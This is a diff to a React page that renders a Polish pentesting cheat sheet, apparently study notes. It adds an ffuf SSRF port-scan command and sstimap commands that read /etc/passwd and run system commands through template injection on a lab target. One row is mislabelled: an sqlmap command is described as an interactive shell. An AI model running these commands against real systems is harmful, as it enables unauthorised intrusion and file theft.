@@ -1,5 +1,7 @@
 import './commends.scss';
 import { Link } from 'react-router-dom';
+import sstimap_functions from '../../assets/sstimap_functions.png';
+import ExampleFrame from '../exampleFrame/ExampleFrame';
 
 const Commends = () => {
 
@@ -265,6 +267,10 @@ const Commends = () => {
                         <td>Odkrywanie rozszerzenia plików</td>
                         <td>ffuf -w web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</td>
                     </tr>
+                    <tr>
+                        <td>Enumeracja portów SSRF</td>
+                        <td>ffuf -w ./ports.txt -u http://SERVER_IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://SERVER_IP:FUZZ/&date=2024-01-01" -fr "Failed to connect to"</td>
+                    </tr>
                 </tbody>
             </table>
 
@@ -475,9 +481,35 @@ const Commends = () => {
                     <td>Tworzenie powłoki systemu operacyjnego</td>
                     </tr>
                 </tbody>
-                </table>
+            </table>
 
-                
+            <hr />
+
+            <h2>sstimap</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                    <th><strong>Komenda</strong></th>
+                    <th><strong>Opis</strong></th>
+                    </tr>
+                </thead>
+                <tbody className='description'>
+                    <tr>
+                    <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'</td>
+                    <td>Pobiera zdalny plik na naszą lokalną maszynę</td>
+                    </tr>
+                    <tr>
+                    <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id</td>
+                    <td>Wykonywanie polecenie systemowe</td>
+                    </tr>
+                    <tr>
+                    <td>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'</td>
+                    <td>Interaktywna powłoka</td>
+                    </tr>
+                </tbody>
+            </table>
+            <ExampleFrame screen={sstimap_functions} />
             
         </section>
     )
